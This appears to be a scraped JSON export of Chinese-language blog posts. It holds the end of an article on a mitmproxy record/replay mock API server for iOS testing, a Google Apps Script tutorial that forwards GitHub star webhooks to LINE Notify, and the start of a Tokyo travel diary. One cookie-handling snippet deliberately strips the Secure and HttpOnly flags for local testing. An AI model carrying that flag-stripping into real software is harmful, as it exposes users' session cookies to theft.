檔案邏輯：回應的內容： Content-0.xxx 、 Content-1.xxx (同個請求打第二次)…以此類推；回應的 Header 資訊： Header-0.json (同 Content-x 邏輯) 儲存時會依照路徑、檔案邏輯依序儲存；在 Replay 時同樣依序取出 如果次數不匹配，例如 Replay 時同個路徑打了 3 次，但 Record 儲存的資料只存到第 2 次；則還是會持續回應第 2 次，也就是最後一次的結果 record 為 True 時，會去打目標 Server 取得回應並依照上述邏輯儲存下來； False 時則只會從本地讀資料 (等於 Replay Mode) network_restricted 為 False 時，本地沒 Mapping 資料會直接回應 404 ；為 True 時會去打目標 Server 拿資料。 _responseFromMitmproxy 用於告知 Response Method 當前回應來自 Local，可以忽略不管、 _status_code 借用 Header.json 欄位儲存 HTTP Response 狀態碼。config_file.json 設置檔案邏輯設計如下：{ \"ignored\": { \"paths\": { \"yourapihost.com\": { \"add-to-cart\": { \"POST\": { \"queryParamters\": [ \"created_timestamp\" ], \"formDataParameters\": [] } }, \"api-status-checker\": { \"GET\": { \"iterable\": true } } } }, \"global\": { \"queryParamters\": [ \"timestamp\" ], \"formDataParameters\": [] } }}queryParamters &amp; formDataParameters :因部分 API 參數可能會隨呼叫改變，例如有的 Endpoint 會帶上時間參數，此時依照 Server 的設計， Hash(Query Parameter &amp; Body Content) 的值就會在 Replay Request 時不一樣，導致 Mapping 不到 Local Response，因此多開了一個 config.json 處理這個情況，可以 by Endpoint Path or Global 設定某個參數應該在排除 Hash 時排除，就能取得同樣的 Mapping 結果。iterable :因部分輪詢檢查的 API 可能會重複定時不斷呼叫，照 Server 的設計會產出很多 Content-x.xxx &amp; Header-x.json 檔案；但假設我們不在意則可設定為 True ，Response 會持續儲存覆蓋到 Content-0.xxx &amp; Header-0.json 第一個檔案內。啟用 Reverse Proxy Record Mode：mitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=loginFlow --set config_file=config.json啟用 Reverse Proxy Replay Mode：mitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=loginFlow --set config_file=config.json組裝 &amp; Proof Of Concept0. 完成 Codebase 中 Host 的抽換並確認在跑測試時，API 已改用 http://127.0.0.1:80801. 啟動 Snapshot API Local Mock Server (a.k.a Reverse Proxy Server) Record Modemitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=addCart --set config_file=config.json2. 執行 E2E Testing UI 操作以 Pinkoi iOS App 為例，測試以下流程： Launch App -&gt; Home -&gt; Scroll Down -&gt; Similar to Wish List Items Section -&gt; First Product -&gt; Click First Product -&gt; Enter Product Page -&gt; Click Add to Cart -&gt; UI Response Added to Cart -&gt; Test Successful ✅UI 自動化操作方式前面有提到，這邊先手動測試相同的流程驗證結果。3. 取得 Record 結果操作完成後可以下 ^ + C 終止 Snapshot API Mock Server，到檔案目錄查看錄製結果：4. Replay 驗證同個流程，啟動 Server &amp; Using Replay Modemitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=addCart --set config_file=config.json5. 再次執行剛剛的 UI 操作驗證結果 左：Test Successful ✅ 右：測試點擊錄製以外的商品，此時會出現 Error (因本地沒資料 + network_restricted 預設是 False 本地沒資料直接傳 404，不會從網路拿資料)6. Proof Of Concept ✅概念驗證通過，我們確實能透過實現 Reverse Proxy Server 來自行儲存 API Request &amp; Response 並作為 Mock API Server 在測試時回應資料給 App 🎉🎉🎉。[2023–09–04] mitmproxy-rodo 已開源後續和雜記本文只探討了概念驗證，後續還有許多地方要補齊也還有更多功能可以實現。 與 maestro UI Testinga 工具整合 CI/CD 流程整合設計 (怎麼自動起 Reverse Proxy? 起在哪裡? ) 怎麼把 MITMProxy 封裝在開發工具內? 驗證更複雜的測試場景 針對發送的 Tracking Request 做驗證，需多實現存 Request Body，然後從中取得打了哪些 Tracking Event Data、是否符合流程該送的事件Cookie 問題#... def response(self, flow): setCookies = flow.response.headers.get_all(\"set-cookie\") # setCookies = ['ad=0; Domain=.xxx.com; expires=Wed, 23 Aug 2023 04:59:07 GMT; Max-Age=1800; Path=/', 'sessionid=xxxx; Secure; HttpOnly; Domain=.xxx.com; expires=Wed, 23 Aug 2023 04:59:07 GMT; Max-Age=1800; Path=/'] # OR Replace Cookie Domain From .xxx.com To 127.0.0.1 setCookies = [re.sub(r\"\\s*\\.xxx\\.com\\s*\", \"127.0.0.1\", s) for s in setCookies] # AND 移除安全性相關限制 setCookies = [re.sub(r\";\\s*Secure\\s*\", \"\", s) for s in setCookies] setCookies = [re.sub(r\";\\s*HttpOnly;\\s*\", \"\", s) for s in setCookies] flow.response.headers.set_all(\"Set-Cookie\", setCookies) #...如果有遇到 Cookie 方面的問題，例如 API 有回應 Cookie 但 App 沒接到，可參考以上的調整。在 Pinkoi 的最後一篇文章在 Pinkoi 900 多天的日子裡，實現了許多我職涯上還有 iOS / App 開發、流程的想像，感謝所有隊友，一起走過疫情、經歷風雨；告別的勇氣如同當初追尋夢想入職的勇氣。 正在啟航找尋新的人生挑戰(包括但不限於工程)，如果您有合適的機會（iOS or 工程管理 or 新創產品）歡迎與我聯絡。 🙏🙏🙏有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 506 Total Views Last Statistics Date: 2025-01-19 | 500 Views on Medium. " }, { "title": "使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier", "url": "/posts/382218e15697/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-app-script, github, notifications, stars", "date": "2023-08-01 22:32:14 +0800", "snippet": "使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier撰寫 GAS 串接 Github Webhook 轉發按星星 Like 通知到 Line前言身為開源專案的維護者，不為錢不為名，只為一個 虛榮心 ；每當看到有新的 ⭐️ 星星時，心中都竊喜不已；花時間花精力做的專案真的有人在用、真的有幫助的有同樣問題的朋友。Star History ...", "content": "使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier撰寫 GAS 串接 Github Webhook 轉發按星星 Like 通知到 Line前言身為開源專案的維護者，不為錢不為名，只為一個 虛榮心 ；每當看到有新的 ⭐️ 星星時，心中都竊喜不已；花時間花精力做的專案真的有人在用、真的有幫助的有同樣問題的朋友。Star History Chart因此對 ⭐️ 星星的觀測多少有點強迫症，時不時就刷一下 Github 查看 ⭐️星星 數有沒有增加；我就在想有沒有更主動一點的方式，當有人 按 ⭐️星星 時主動跳通知提示，不需要手動追蹤查詢。現有工具首先考慮尋找現有工具達成，到 Github Marketplace 搜尋了一下，有幾個大神做好的工具可以使用。試了其中幾個效果不如預期，有的已不在運作、有的只能在每 5/10/20 個 ⭐️星星 時發送通知(我只是小小，有 1 個新的 ⭐️ 就很開心了😝)、通知只能發信件但我想要用 SNS 通知。再加上只是為了「虛榮心」裝一個 App，心裡不太踏實，怕有資安風險問題。iOS 上的 Github App 或 GitTrends …等等第三方 App 也都不支援此功能。自己打造 Github Repo Star Notifier基於以上，其實我們可以直接用 Google Apps Script 免費、快速打造自己的 Github Repo Star Notifier。2024/10/12 Update ⚠️⚠️⚠️ 因 Line Notify 將於 2025/04/01 關閉 ，請參考 我的最新文章「 10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知 」 改使用 Telegram 串接通知功能。準備工作本文以 Line 做為通知媒介，如果你想使用其他通訊軟體通知可以詢問 ChatGPT 如何實現。詢問 ChatGPT 如何實現 Line NotifylineToken ： 前往 Line Notify 登入你的 Line 帳號之後拉到底找到「Generate access token (For developers)」區 點擊「Generate token」 Token Name：輸入你想要的機器人頭銜名稱，會顯示在訊息之前 (e.g. Github Repo Notifer: XXXX ) 選擇訊息要傳送到的地方：我選擇 1-on-1 chat with LINE Notify 透過 LINE Notify 官方機器人發送訊息給自己。 點擊「Generate token」 選擇「Copy」 並記下 Token，如果日後遺忘需要重新產生，無法再次查看 。githubWebhookSecret ： 前往 Random.org 產生一組隨機字串 Copy &amp; 記下此隨機字串我們會用這組字串做為 Github Webhook 與 Goolge Apps Script 之間的請求驗證媒介。 因 GAS 限制 ，無法在 doPost(e) 中取得 Headers 內容，因此不能使用 Github Webhook 標準的驗證方式 ，只能手動用 ?secret= Query 做字串匹配驗證。建立 Google Apps Script前往 Google Apps Script ，點擊左上角「+ 新專案」。Google Apps Script點擊左上方「未命名的專案」重新命名專案。這邊我把專案取名為 My-Github-Repo-Notifier 方便日後辨識。程式碼輸入區域：// Constant variablesconst lineToken = 'XXXX';// Generate yours line notify bot token: https://notify-bot.line.me/my/const githubWebhookSecret = \"XXXXX\";// Generate yours secret string here: https://www.random.org/strings/?num=1&amp;len=32&amp;digits=on&amp;upperalpha=on&amp;loweralpha=on&amp;unique=on&amp;format=html&amp;rnd=new// HTTP Get/Post Handler// 不開放 Get 方法function doGet(e) { return HtmlService.createHtmlOutput(\"Access Denied!\");}// Github Webhook 會使用 Post 方法進來function doPost(e) { const content = JSON.parse(e.postData.contents); // 安全性檢查，確保請求是來自 Github Webhook if (verifyGitHubWebhook(e) == false) { return HtmlService.createHtmlOutput(\"Access Denied!\"); } // star payload data content[\"action\"] == \"started\" if(content[\"action\"] != \"started\") { return HtmlService.createHtmlOutput(\"OK!\"); } // 組合訊息 const message = makeMessageString(content); // 發送訊息，也可改成發到 Slack,Telegram... sendLineNotifyMessage(message); return HtmlService.createHtmlOutput(\"OK!\");}// Method// 產生訊息內容function makeMessageString(content) { const repository = content[\"repository\"]; const repositoryName = repository[\"name\"]; const repositoryURL = repository[\"svn_url\"]; const starsCount = repository[\"stargazers_count\"]; const forksCount = repository[\"forks_count\"]; const starrer = content[\"sender\"][\"login\"]; var message = \"🎉🎉「\"+starrer+\"」starred your「\"+repositoryName+\"」Repo 🎉🎉\\n\"; message += \"Current total stars: \"+starsCount+\"\\n\"; message += \"Current total forks: \"+forksCount+\"\\n\"; message += repositoryURL; return message;}// 驗證請求是否來自於 Github Webhook// 因 GAS 限制 (https://issuetracker.google.com/issues/67764685?pli=1)// 無法取得 Headers 內容// 因此不能使用 Github Webhook 標準的驗證方式 (https://docs.github.com/en/webhooks-and-events/webhooks/securing-your-webhooks)// 只能手動用 ?secret=XXX 做匹配驗證function verifyGitHubWebhook(e) { if (e.parameter[\"secret\"] === githubWebhookSecret) { return true } else { return false }}// -- Send Message --// Line// 其他訊息傳送方式可問 ChatGPTfunction sendLineNotifyMessage(message) { var url = 'https://notify-api.line.me/api/notify'; var options = { method: 'post', headers: { 'Authorization': 'Bearer '+lineToken }, payload: { 'message': message } }; UrlFetchApp.fetch(url, options);}lineToken &amp; githubWebhookSecret 帶上前一步驟複製的值。補充 Github Webook 當有人按 Star 時會打進來的資料如下：{ \"action\": \"created\", \"starred_at\": \"2023-08-01T03:42:26Z\", \"repository\": { \"id\": 602927147, \"node_id\": \"R_kgDOI-_wKw\", \"name\": \"ZMarkupParser\", \"full_name\": \"ZhgChgLi/ZMarkupParser\", \"private\": false, \"owner\": { \"login\": \"ZhgChgLi\", \"id\": 83232222, \"node_id\": \"MDEyOk9yZ2FuaXphdGlvbjgzMjMyMjIy\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/83232222?v=4\", \"gravatar_id\": \"\", \"url\": \"https://api.github.com/users/ZhgChgLi\", \"html_url\": \"https://github.com/ZhgChgLi\", \"followers_url\": \"https://api.github.com/users/ZhgChgLi/followers\", \"following_url\": \"https://api.github.com/users/ZhgChgLi/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ZhgChgLi/gists{/gist_id}\", \"starred_url\": \"https://api.github.com/users/ZhgChgLi/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ZhgChgLi/subscriptions\", \"organizations_url\": \"https://api.github.com/users/ZhgChgLi/orgs\", \"repos_url\": \"https://api.github.com/users/ZhgChgLi/repos\", \"events_url\": \"https://api.github.com/users/ZhgChgLi/events{/privacy}\", \"received_events_url\": \"https://api.github.com/users/ZhgChgLi/received_events\", \"type\": \"Organization\", \"site_admin\": false }, \"html_url\": \"https://github.com/ZhgChgLi/ZMarkupParser\", \"description\": \"ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.\", \"fork\": false, \"url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser\", \"forks_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/forks\", \"keys_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/keys{/key_id}\", \"collaborators_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/collaborators{/collaborator}\", \"teams_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/teams\", \"hooks_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/hooks\", \"issue_events_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues/events{/number}\", \"events_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/events\", \"assignees_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/assignees{/user}\", \"branches_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/branches{/branch}\", \"tags_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/tags\", \"blobs_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/blobs{/sha}\", \"git_tags_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/tags{/sha}\", \"git_refs_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/refs{/sha}\", \"trees_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/trees{/sha}\", \"statuses_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/statuses/{sha}\", \"languages_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/languages\", \"stargazers_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/stargazers\", \"contributors_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/contributors\", \"subscribers_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/subscribers\", \"subscription_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/subscription\", \"commits_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/commits{/sha}\", \"git_commits_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/commits{/sha}\", \"comments_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/comments{/number}\", \"issue_comment_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues/comments{/number}\", \"contents_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/contents/{+path}\", \"compare_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/compare/{base}...{head}\", \"merges_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/merges\", \"archive_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/{archive_format}{/ref}\", \"downloads_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/downloads\", \"issues_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues{/number}\", \"pulls_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/pulls{/number}\", \"milestones_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/milestones{/number}\", \"notifications_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/notifications{?since,all,participating}\", \"labels_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/labels{/name}\", \"releases_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/releases{/id}\", \"deployments_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/deployments\", \"created_at\": \"2023-02-17T08:41:37Z\", \"updated_at\": \"2023-08-01T03:42:27Z\", \"pushed_at\": \"2023-08-01T00:07:41Z\", \"git_url\": \"git://github.com/ZhgChgLi/ZMarkupParser.git\", \"ssh_url\": \"git@github.com:ZhgChgLi/ZMarkupParser.git\", \"clone_url\": \"https://github.com/ZhgChgLi/ZMarkupParser.git\", \"svn_url\": \"https://github.com/ZhgChgLi/ZMarkupParser\", \"homepage\": \"https://zhgchg.li\", \"size\": 27449, \"stargazers_count\": 187, \"watchers_count\": 187, \"language\": \"Swift\", \"has_issues\": true, \"has_projects\": true, \"has_downloads\": true, \"has_wiki\": true, \"has_pages\": false, \"has_discussions\": false, \"forks_count\": 10, \"mirror_url\": null, \"archived\": false, \"disabled\": false, \"open_issues_count\": 2, \"license\": { \"key\": \"mit\", \"name\": \"MIT License\", \"spdx_id\": \"MIT\", \"url\": \"https://api.github.com/licenses/mit\", \"node_id\": \"MDc6TGljZW5zZTEz\" }, \"allow_forking\": true, \"is_template\": false, \"web_commit_signoff_required\": false, \"topics\": [ \"cocoapods\", \"html\", \"html-converter\", \"html-parser\", \"html-renderer\", \"ios\", \"nsattributedstring\", \"swift\", \"swift-package\", \"textfield\", \"uikit\", \"uilabel\", \"uitextview\" ], \"visibility\": \"public\", \"forks\": 10, \"open_issues\": 2, \"watchers\": 187, \"default_branch\": \"main\" }, \"organization\": { \"login\": \"ZhgChgLi\", \"id\": 83232222, \"node_id\": \"MDEyOk9yZ2FuaXphdGlvbjgzMjMyMjIy\", \"url\": \"https://api.github.com/orgs/ZhgChgLi\", \"repos_url\": \"https://api.github.com/orgs/ZhgChgLi/repos\", \"events_url\": \"https://api.github.com/orgs/ZhgChgLi/events\", \"hooks_url\": \"https://api.github.com/orgs/ZhgChgLi/hooks\", \"issues_url\": \"https://api.github.com/orgs/ZhgChgLi/issues\", \"members_url\": \"https://api.github.com/orgs/ZhgChgLi/members{/member}\", \"public_members_url\": \"https://api.github.com/orgs/ZhgChgLi/public_members{/member}\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/83232222?v=4\", \"description\": \"Building a Better World Together.\" }, \"sender\": { \"login\": \"zhgtest\", \"id\": 4601621, \"node_id\": \"MDQ6VXNlcjQ2MDE2MjE=\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/4601621?v=4\", \"gravatar_id\": \"\", \"url\": \"https://api.github.com/users/zhgtest\", \"html_url\": \"https://github.com/zhgtest\", \"followers_url\": \"https://api.github.com/users/zhgtest/followers\", \"following_url\": \"https://api.github.com/users/zhgtest/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/zhgtest/gists{/gist_id}\", \"starred_url\": \"https://api.github.com/users/zhgtest/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/zhgtest/subscriptions\", \"organizations_url\": \"https://api.github.com/users/zhgtest/orgs\", \"repos_url\": \"https://api.github.com/users/zhgtest/repos\", \"events_url\": \"https://api.github.com/users/zhgtest/events{/privacy}\", \"received_events_url\": \"https://api.github.com/users/zhgtest/received_events\", \"type\": \"User\", \"site_admin\": false }}部署完成程式撰寫之後點擊右上角「部署」-&gt;「新增部署作業」：左側選取類型選擇「網頁應用程式」： 新增說明：隨意輸入，我輸入「 Release 」 誰可以存取： 請改成「 所有人 」 點擊「部署」首次部署，需要點擊「授予存取權」：跳出帳號選擇 Pop-up 後選擇自己當前的 Gmail 帳號：出現「Google hasn’t verified this app」因為我們要開發的 App 是給自己用的，不需經過 Google 驗證。直接點擊「Advanced」-&gt;「Go to XXX (unsafe)」-&gt;「Allow」即可：完成部署後可在結果頁面的「網頁應用程式」得到 Request URL，點擊「複製」並記下此 GAS 網址。⚠️️️ 題外話，請注意如果程式碼有修改需要更新部署才會生效⚠️要使更改的程式碼生效，同樣點擊右上角「部署」-&gt; 選擇「管理部署作業」-&gt;選擇右上角的「✏️」-&gt;版本選擇「建立新版本」-&gt;點擊「部署」。即可完成程式碼更新部署。Github Webhook 設定 回到 Github 我們可以對 Organizations (裡面所有 Repo)或單個 Repo 設定 Webhook，監聽新的 ⭐️ 星星進入 Organizations / Repo -&gt; 「Settings」-&gt; 左側找到「Webhooks」-&gt; 「Add webhook」： Payload URL ： 輸入 GAS 網址 並在網址後面手動加上我們自己的安全驗證字串 ?secret=githubWebhookSecret 。例如你的 GAS 網址 是 https://script.google.com/macros/s/XXX/exec 、 githubWebhookSecret 是 123456 ；則 網址即為： https://script.google.com/macros/s/XXX/exec?secret=123456 。 Content type： 選擇 application/json Which events would you like to trigger this webhook? 選擇「 Let me select individual events. 」 ⚠️️取消勾選「 Pushes 」 ️️️️⚠️勾選「 Watches 」，請注意不是「 Stars 」(但 Stars 也是監控點擊星星的狀態，如果用 Stars GAS 的 action 判斷也需要調整 ) 選擇「 Active 」 點擊「Add webhook」 完成設定🚀測試回到 設定的 Organizations Repo / Repo 上點擊「Star」或先 un-star 再重新 「Star」：就會收到推播通知囉！收工！🎉🎉🎉🎉工商有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 613 Total Views Last Statistics Date: 2025-01-19 | 517 Views on Medium. " }, { "title": "遊記 2023 東京 5 日自由行", "url": "/posts/9da2c51fa4f2/", "categories": "Z 度旅行遊記", "tags": "生活, japan, tokyto, tokyo-disneysea, traveling", "date": "2023-07-10 00:00:37 +0800", "snippet": "[遊記] 2023 東京 5 日自由行繼上個月京阪神後，2023/06 東京 5 日自由行紀錄及食住行資訊2023/05 京阪神 8 日自由行繼上一篇「 [遊記] 2023 京阪神 &amp; 🇯🇵初次著陸 」很快地，隔了一週又再次來到日本。你說為何不待在日本直接搭新幹線從大阪到東京？原因是東京行其實才是本來預期內安排的出國旅行，京阪神之行純屬程咬金。加上懶得改機票跟改住宿和不想有一週要 W...", "content": "[遊記] 2023 東京 5 日自由行繼上個月京阪神後，2023/06 東京 5 日自由行紀錄及食住行資訊2023/05 京阪神 8 日自由行繼上一篇「 [遊記] 2023 京阪神 &amp; 🇯🇵初次著陸 」很快地，隔了一週又再次來到日本。你說為何不待在日本直接搭新幹線從大阪到東京？原因是東京行其實才是本來預期內安排的出國旅行，京阪神之行純屬程咬金。加上懶得改機票跟改住宿和不想有一週要 Work From Japan (覺得玩就要純粹玩)，所以京阪神完就先回來台灣。後面來看，還好有回來；因為回台灣的那週日本遇到超強颱風，淹水、新幹線停駛、車站塞爆；如果那週在日本想必也沒什麼地方可以去吧。(終於不是🌧️雨神了啊啊啊)東京行的組合 — 三單男我 &amp; 當前同事 (Sean) &amp; 前前同事 ( James Lin )；其中 Sean &amp; James 是大學同學。(沒錯，業界就是這麼小 XD) 日本入境資訊、其他資訊心得分享請參考 前一篇 。KKday 推廣 KKday 日本｜東京迪士尼度假區門票｜Tokyo Disney Resort 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 SHIBUYA SKY 展望台電子門票｜即買即用 日本・東京|江戶・淺草雷門・晴空塔|人力車體驗 東京和服租借推薦!】日本東京淺草|和服體驗(淺草首家日雜風和服店家、距離雷門只需要徒步3分鐘) 日本東京｜東京鐵塔大展望台 Tokyo Tower ｜電子門票行前準備說歸說東京行才是預期出國安排內，但我們也一直只停留在嘴上説說；直到我京阪神那邊都確定的差不多了，東京這邊也才開始規劃跟實際執行。樂tripmoment對沒去過的地方，我依然是 ENFP 隨性派，覺得去哪裡都很新鮮；所以主要只負責大方向的機票跟住宿還有交通；景點就看其他旅伴想去哪或當下感覺想去哪看看才決定。樂，主要由 Sean &amp; James Handle 了一切，我們有計劃需要先買票的是迪士尼樂園(海洋)跟橫濱鋼彈、Shibuya Sky；因此在出發前兩週就先買好票了。 以上沒有先買，到現場都是沒有空的位子可以進去的。這次我家上次剩的，帶了 $60,000 日幣，最後只剩 $5,00 上下。 因為在新宿的藥妝店遇到 Visa 刷不過只能付現金 $10,000 多買藥妝，還有最後想說把現金花光。 另外最後還差點回不來，在東京車站買往成田機場的車票時不能刷卡，東湊西湊下才湊齊車錢。行🛫因為這次只排 5 天，時間不多，因此機票優先選早去晚回；因為日期接近一樣直接上 SkyScanner 找時間好的航班了。桃園 &lt;-&gt; 成田 6/7 長榮 BR 184 08:00 TPE -&gt; NRT 12:25 6/22 長榮 BR 195 20:40 NRT -&gt; TPE 23:20來回： $17,086 這邊犯了個錯， 就是不應該一個人刷三張機票 ，要自己買自己的，因信用卡刷卡買機票會送旅遊保險。 後來還發現松山飛羽田沒貴多少還比較方便 Orz。旅遊險：Done📲一樣上 KKDAY 買 5 天吃到飽的 SIM 卡約 $500。( 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 )🚈同 上篇 iPhone 一樣直接使用西瓜卡，我朋友是 Android 就只能去買 Welcome Suica 限時西瓜卡（在成田機場問，真的只剩這個）。住這次只去東京，因此就找一間能住四天不用換的；因為時間接近，東京連鎖的 東橫 Inn or APA 全都沒有空房了；只能上 Agoda 找東京地圖靠近中間又有電車地鐵站的飯店。Hotel Villa Fontaine Grand Tokyo-Shiodome — 4 晚出來就是汐留站，可以直接去台場或新宿。如果要去其他地點要走路到新橋站(大約 10 分鐘)，從新橋過到東京車站大約也是再 10 分鐘 (1–2 站的距離)。還算方便並且價格合理、評價 OK，實際住下來除了乾淨舒服，房間內也不會太小。因為是三個人，格局是兩張床＋沙發上鋪床墊（實際睡起來跟床一樣）3人共 NT$23,894町．草休行館 CHO Stay Capsule Hotel-全台唯一機場膠囊旅館 | 桃園機場膠囊旅館 | 桃園機場飯店 | Taoyuan Airport Hotel | 桃園空港 ホテル — Day 0 過夜這次出行比較特別的是因為是一早 8 點的飛機，我們又都從台北出發；抓 6 點到機場，凌晨 4–5 點就要出門了；加上要出去玩的緊張興奮會難以入眠，根本睡不了幾個小時。因此在出發前幾天決定前一天晚上就先去機場過夜，聽朋友說才知道原來桃園機場有膠囊旅館，就來試試了！地點：就在第二航廈南側號5樓，下樓就是第二航廈 (走下來約 5 分鐘)房間有雙人房、三人房、四人房、跟單人床位 (大概有 16 個床位一間)我們訂的時候就只剩單人床位了。1人 NT$1,500Day 0 出發基本上我就是把京阪神買的東西卸貨，把一些衣物用品拿出來，再重新整理放回行李箱就出發了。機捷預辦登機目前還不能辦理隔日航班，因此只能提著行李箱大包小包的去第二航廈。Sean &amp; Me &amp; James到達第二航廈後直上三樓出境大廳，到達出境大廳後找到往 22–26 南側商場觀景台的位置(面對大廳往右走到底)。走到底看到手扶梯往上走手扶梯一上來就會看到很有台灣風格的旅館門口桃機膠囊旅館Check-In 後就能先進去放行李，然後出來外面覓食。 房間內禁止飲食，我們這次入住每人送一個茶包可以請櫃檯幫忙泡，坐在門口吧台喝，現場填寫加入會員有送毛巾。門口有耳塞可以免費索取。走廊衛浴設施很新很乾淨舒服，馬桶有兩個、淋浴間有五間、有兩隻吹風機(1 隻 Dyson)、有提供沐浴乳洗髮精，只要自備毛巾盥洗用具。男衛浴一進來左手邊有行李房可以放行李，床位格局如下：床位宿舍每個床位都有獨立的鏡子、書桌、燈、窗簾、垃圾桶；我睡的是上鋪，床墊很厚不怕因為動來動去吵到下舖。床墊除了厚之外也夠長，176 CM 睡起來沒什麼問題；環境乾淨、燈光溫馨、冷氣很舒服；唯一不可抗拒的因素就是有人打呼還是會傳遞進來。(所以門口有提供免費耳塞)不過我不怕吵，只要溫馨放鬆就能睡得很好；於是我一覺到天亮，直接睡到快 6 點才洗漱 Check-out（直接睡飽睡滿，再出國）。 還好我們前一晚有預定，遇到有其他旅客想現場入住，已經沒位子了。一早起來先悠閒的看一下機場風景：本來以為早上 8 點會人擠人但運氣很好幾乎沒人 早知道就在膠囊旅館睡到 7 點再下來了！候機這次遇到的登機口要搭接駁車(大陸網友稱擺渡車)很熱很擠，但還是到登機口了：Bye 🇹🇼抵達成田機場Hey 🇯🇵Day 1 渋谷、Parco、Shibuya Sky從下機到入境大廳大概要走個 15 分鐘，再到提領行李實際出關入境大約已經下午 1 點了。 轉搭成田特快的時候一開始犯蠢，直接刷 西瓜卡進站；結果整班特快都是指定席，只能回頭出站買票再進站（後來發現好像可以直接在站內月台機器買票）。後來搭上兩點出的成田特快往東京車站。一路看風景，能看到晴空塔的時候就代表快到了。到達東京車站後再轉搭地鐵到新橋站，然後找路、走路到汐留。飯店藏身在辦公大樓內，很特別：一開始以為走錯走到人家辦公大樓，結果往裡面走就是飯店了。放行李、休息一下：Hotel Villa Fontaine Grand Tokyo Shiodome (影片是後來才補拍的，有點亂ＸＤ)前往 渋谷 (澀谷) Shibuya這個十字路口一定要來朝聖一下，想到今際之國的闖關者。Netflix — 今際の国のアリス渋谷 Parco — 極味屋排隊品嘗有名的極味屋，大約 5 點半左右到，排差不多 45 分鐘就有位子了。我點的是神戶牛漢堡肉＋神戶牛排＋湯飯冰淇淋的套餐組合 ($3,355 日圓)：店員幫忙 Set 好時的熟度約只有 1 分，要自己夾起來放到鐵板煎到自己喜好的熟度。極味屋這邊要注意要使用兩雙筷子；因衛生，鐵的用來煎、竹的用來吃，交替使用。 神戶牛排超好吃，汁多裡嫩，沒有任何牛騷味🤩；漢堡肉也不錯，但比較膩一點。渋谷 Parco — 對自己吐槽的白熊專賣店失手買了一些。渋谷 — Shibuya Sky還好 Sean 有提早買票，現場才買根本進不去。 KKday SHIBUYA SKY 展望台電子門票｜即買即用上面很黑、有點風，不能攜帶包包上去(有提供有鎖置物櫃)。除了角落有一家酒吧之外沒有其他設施、光害，拍照跟看夜景很漂亮。酒吧應該要另外訂位，開放時間同參觀時間。回飯店後依然是清酒泡麵點心三件組，結束這一日豆皮泡麵好好吃。Day 2 橫濱鋼彈、台場、新宿第二天一早趕 10 點鋼彈表演，先搭電車到櫻木町站再轉搭纜車＋走路到鋼彈工廠。橫濱鋼彈天氣超級好啊！！鋼彈表演一路從 10 點到中午，不同場次有不同劇情；但因為我不是鋼彈迷所以只是跟來走馬看花。但不得不說很壯觀，細節、動作跟聲音很精緻。裡面還有周邊專賣店，賣鋼彈模型跟獨家商品。Sean 